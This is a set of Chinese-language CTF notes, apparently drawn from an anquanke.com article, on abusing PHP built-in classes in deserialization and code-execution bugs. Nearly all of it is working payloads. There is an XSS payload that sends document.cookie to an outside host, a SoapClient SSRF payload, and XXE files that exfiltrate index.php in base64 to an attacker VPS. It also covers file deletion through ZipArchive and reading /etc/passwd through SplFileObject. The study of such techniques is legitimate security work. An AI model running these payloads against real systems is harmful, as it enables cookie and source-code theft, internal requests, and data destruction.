https://www.anquanke.com/post/id/238482#h2-0
## 常见的内置类：
```
Error,Exception
SoapClient
DirectoryIterator
SimpleXMLElement
```

## Error 类

### 简单命令执行

我们的 Error 类的利用其实来说是能够在存在 `rce` 漏洞的情况下，来实现我们的“任意字符串获得”，说来很抽象，但是我们有一个具体的例子：
```
$class = new $a($b[0],$b[1]);
$str1 = substr($class->$c(),$d,$e);
$str2 = substr($class->$c(),$f,$g);
echo $str1;
echo $str2;
echo($str1($str2));
?>
```

对应 payload
```
$e = new Exception("systemid");
echo $e->getMessage();
```

### XSS 漏洞
这个时候，我们一定是希望我们的结果是可控的，于是，我们就可以让我们的通过构造我们的类为 `Exception` 或者 `Error`，然后来构造我们的一个 `XSS` 漏洞。
```
<?php $a = new Error("<script>alert('xss')</script>"); $b = serialize($a); echo urlencode($b); ?>

--获得我们的对应信息
<?php $poc = new Exception("<script>window.open('http://de28dfb3-f224-48d4-b579-f1ea61189930.node3.buuoj.cn/?'+document.cookie);</script>"); echo urlencode(serialize($poc)); ?>
```

### 哈希绕过


## SoapClient 
### SSRF ：
在我们构造出来一个 `SoapClient` 类的时候，内置类有一个 `__call` 方法，当 `__call` 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 `__call` 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。


对应的payload
```
<?php $a = new SoapClient(null,array('location'=>'http://47.xxx.xxx.72:2333/aaa', 'uri'=>'http://47.xxx.xxx.72:2333')); $b = serialize($a); echo $b; $c = unserialize($b); $c->a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf ?>
```


## SimpleXMLElement
通过设置第三个参数 data_is_url 为 `true`，我们可以实现远程 xml 文件的载入。第二个参数的常量值我们设置为 `2` 即可。第一个参数 data 就是我们自己设置的 payload 的 url 地址，即用于引入的外部实体的 url。这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。

Payload:

首先，我们在 vps（47.xxx.xxx.72）上构造如下 evil.xml、send.xml 和 send.php 这三个文件。
```
---evil.xml
<?xml version="1.0"?> <!DOCTYPE ANY[ <!ENTITY % remote SYSTEM "http://47.xxx.xxx.72/send.xml"> %remote; %all; %send; ]>

---send.xml：
<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=index.php"> <!ENTITY % all "<!ENTITY % send SYSTEM 'http://47.xxx.xxx.72/send.php?file=%file;'>">

---send.php
<?php file_put_contents("result.txt", $_GET['file']) ; ?>
```

```
/show.php?module=SimpleXMLElement&args[]=http://47.xxx.xxx.72/evil.xml&args[]=2&args[]=true
```

## ZipArcive
### 删除文件：
PHP ZipArchive 类是 PHP 的一个原生类，它是在 PHP 5.20之后引入的。ZipArchive 类可以对文件进行压缩与解压缩处理。我们可以利用 ZipArchive 原生类调用 open 方法删除目标主机上的文件。

```
ZipArchive::open($filename, ZipArchive::OVERWRITE)
```

## SplFileObject
### 简单命令执行：
我们对于上述的问题，我们可以通过构造下面的方法，来让我们的变量取到我们的一个固定值：
```
$c=new SplFileObject("data://text/plain,(你需要的字符串信息)")
$vul=$c->current();
```




### 读文件
```
$c=new SplFileObject("文件名");
	echo $c;
```

```
$c=new SplFileObject("php://filter/read=convert.base64-encode/resource=文件名")
echo $c;
```

但我们的缺点是只能读一行，如果我们想要完整的读的话，我们需要用下面的方法！：
```
<?php $context = new SplFileObject('/etc/passwd'); foreach($context as $f){ echo($f); }
```


